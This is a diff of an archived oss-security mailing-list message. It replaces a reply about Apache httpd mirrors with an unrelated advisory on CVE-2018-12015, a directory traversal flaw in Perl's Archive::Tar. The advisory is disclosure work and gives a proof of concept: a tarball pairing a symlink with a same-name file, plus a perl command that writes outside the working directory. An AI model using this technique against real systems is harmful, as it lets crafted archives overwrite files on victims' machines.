@@ -1,47 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/03/25/1
-Message-ID: <87r2o8jukc.fsf@fastmail.com>
-Date: Sun, 25 Mar 2018 12:52:51 +0200
-From: Marius Bakke <mbakke@...tmail.com>
-To: Daniel Ruggeri <druggeri@...che.org>, oss-security@...ts.openwall.com, security@...pd.apache.org
-Subject: Re: CVE-2017-15710: Out of bound write in mod_authnz_ldap when using too small Accept-Language values
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/07/4
+Message-ID: <20180607184125.GA16629@eldamar.local>
+Date: Thu, 7 Jun 2018 20:41:25 +0200
+From: Salvatore Bonaccorso <carnil@...ian.org>
+To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
+Subject: Perl: CVE-2018-12015: Archive::Tar: directory traversal vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Daniel Ruggeri <druggeri@...che.org> writes:
+Hi
 
-> CVE-2017-15710: Out of bound write in mod_authnz_ldap when using too small Accept-Language values.
->
-> Severity: Low
->
-> Vendor: The Apache Software Foundation
->
-> Versions Affected:
-> httpd 2.0.23 to 2.0.65
-> httpd 2.2.0 to 2.2.34
-> httpd 2.4.0 to 2.4.29
+The following dirctory traversal vulnerability was reporte to the
+Debian bugtracker at https://bugs.debian.org/900834 , which got
+assigned CVE-2018-12015 by MITRE (requested via the
+http://cveform.mitre.org/):
 
-[...]
+> By default, the Archive::Tar module doesn't allow extracting files
+> outside the current working directory. However, you can bypass this
+> secure extraction mode easily by putting a symlink and a regular file
+> with the same name into the tarball.
+> 
+> I've attached proof of concept tarball, which makes Archive::Tar create
+> /tmp/moo, regardless of what the current working directory is:
+> 
+>   $ tar -tvvf traversal.tar.gz
+>   lrwxrwxrwx root/root         0 2018-06-05 18:55 moo -> /tmp/moo
+>   -rw-r--r-- root/root         4 2018-06-05 18:55 moo
+> 
+>   $ pwd
+>   /home/jwilk
+> 
+>   $ ls /tmp/moo
+>   ls: cannot access '/tmp/moo': No such file or directory
+> 
+>   $ perl -MArchive::Tar -e 'Archive::Tar->extract_archive("traversal.tar.gz")'
+> 
+>   $ ls /tmp/moo
+>   /tmp/moo
 
-> Mitigation:
-> All httpd users should upgrade to 2.4.30 or later.
+The mentioned proof of concept tarball is attached to the Debian bug at
+https://bugs.debian.org/cgi-bin/bugreport.cgi?att=1;bug=900834;filename=traversal.tar.gz;msg=3
+.
 
-[...]
-
-> References:
-> https://httpd.apache.org/security/vulnerabilities_24.html
-
-Perhaps I'm hitting an outdated mirror (195.154.151.36), but this page
-lists "OptionsBleed" as the most recent CVE, and the download page shows
-2.4.29 as the latest release.
-
-I found 2.4.33 by browsing my suggested mirror "manually", but it does
-not have the PGP signatures.
-
-https://apache.uib.no/httpd/
-
-I had to go to <https://www-eu.apache.org/dist/httpd/> in order to
-verify the integrity.
-
-Please look into it, and thanks for the notices.
-
-Download attachment "signature.asc" of type "application/pgp-signature" (488 bytes)
+Regards,
+Salvatore
